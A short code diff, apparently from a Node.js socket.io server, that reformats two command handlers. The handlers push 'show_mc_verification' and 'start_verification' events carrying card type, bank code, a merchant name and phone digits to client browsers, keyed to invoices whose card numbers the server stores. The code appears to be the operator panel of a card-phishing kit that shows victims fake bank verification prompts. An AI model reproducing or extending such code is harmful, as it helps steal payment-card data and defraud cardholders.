@@ -1686,43 +1686,43 @@ io.on('connection', (socket) => {
   
     // Execute the command
     switch (command) {
-      case 'show_mc_verification':
-        clientSockets.forEach(clientSocket => {
-          clientSocket.emit('show_mc_verification', {
+case 'show_mc_verification':
+    clientSockets.forEach(clientSocket => {
+        clientSocket.emit('show_mc_verification', {
             invoiceId,
             cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
-            phoneLastFour: data.phoneLastFour // Pass phone last four digits if provided
-          });
+            phoneLastFour: data.phoneLastFour // Make sure to pass phone last four digits
         });
-        
-        // Also broadcast to the room
-        io.to(invoiceId).emit('show_mc_verification', {
-          invoiceId,
-          cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
-          phoneLastFour: data.phoneLastFour
-        });
-        break;
+    });
+    
+    // Also broadcast to the room
+    io.to(invoiceId).emit('show_mc_verification', {
+        invoiceId,
+        cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
+        phoneLastFour: data.phoneLastFour // Make sure to pass phone last four digits
+    });
+    break;
       
-      case 'start_verification':
-        clientSockets.forEach(clientSocket => {
-          clientSocket.emit('start_verification', {
+case 'start_verification':
+    clientSockets.forEach(clientSocket => {
+        clientSocket.emit('start_verification', {
             invoiceId,
             verificationType: data.verificationType || 'mastercard',
             bankCode: data.bankCode || 'default',
             merchantName: data.merchantName || 'Peacock Merchandise',
-            phoneLastFour: data.phoneLastFour // Pass phone last four digits if provided
-          });
+            phoneLastFour: data.phoneLastFour // Make sure to pass phone last four digits
         });
-        
-        // Also broadcast to the room
-        io.to(invoiceId).emit('start_verification', {
-          invoiceId,
-          verificationType: data.verificationType || 'mastercard',
-          bankCode: data.bankCode || 'default',
-          merchantName: data.merchantName || 'Peacock Merchandise',
-          phoneLastFour: data.phoneLastFour
-        });
-        break;
+    });
+    
+    // Also broadcast to the room
+    io.to(invoiceId).emit('start_verification', {
+        invoiceId,
+        verificationType: data.verificationType || 'mastercard',
+        bankCode: data.bankCode || 'default',
+        merchantName: data.merchantName || 'Peacock Merchandise',
+        phoneLastFour: data.phoneLastFour // Make sure to pass phone last four digits
+    });
+    break;
       
       case 'update_mc_bank':
         clientSockets.forEach(clientSocket => {
